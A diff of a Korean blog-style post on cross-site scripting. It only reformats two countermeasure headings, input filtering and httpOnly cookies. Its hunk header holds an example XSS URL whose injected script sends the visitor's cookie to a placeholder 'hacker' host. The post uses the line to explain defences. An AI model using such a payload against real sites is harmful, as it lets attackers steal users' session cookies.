@@ -53,13 +53,13 @@ http://service.com?search=<script>location.href('http://hacker/cookie.php?value=
 
 # 대응 방안
 
-1. 필터 사용
+##### 1. 필터 사용
 
 유저가 `input` 태그에 텍스트를 입력해야하는 경우, 이 때 필터를 적용할 수 있다. 개인이 만든 필터보다는 전문적인 보안 업체나 기업에서 만든 것이 공신력있고 편하게 사용할 수 있다. 주로 <a href="https://wiki.owasp.org/index.php/Category:OWASP_AntiSamy_Project" target="_blank" rel="noopener">OWASP Antisamy</a>가 있다.
 
 예를 들면, 텍스트가 입력되어 서버로 요청하기 전에 검증을 하여 대응할 수 있다. `input` 태그에 만약 `<` 또는 `>` 같은 태그 문자(`<script>` 방지)를 입력했을 때 이를 필터링한다. 이 때 출력되는 값을 `<` 와 같은 태그 문자 대신 HTML 문자로 변환하여 출력한다. 이렇게 하면 `<` 문자는 `&lt;` 로 변경된다. 즉, HTML 문서는 `&lt;script&gt;` 로 인식하여 `<script>` 태그 속의 코드는 실행되지 않는다.
 
-2. 쿠키 보안 옵션 사용
+##### 2. 쿠키 보안 옵션 사용
 
 쿠키를 생성할 때 보안 옵션을 사용하여 웹 브라우저 상에서만 쓸 수 있도록 해야 한다. Node 환경에서 Express를 사용한다면, `httpOnly` 옵션을 쿠키에 지정하여 웹 브라우저상에서만 쿠키를 사용할 수 있다.
 
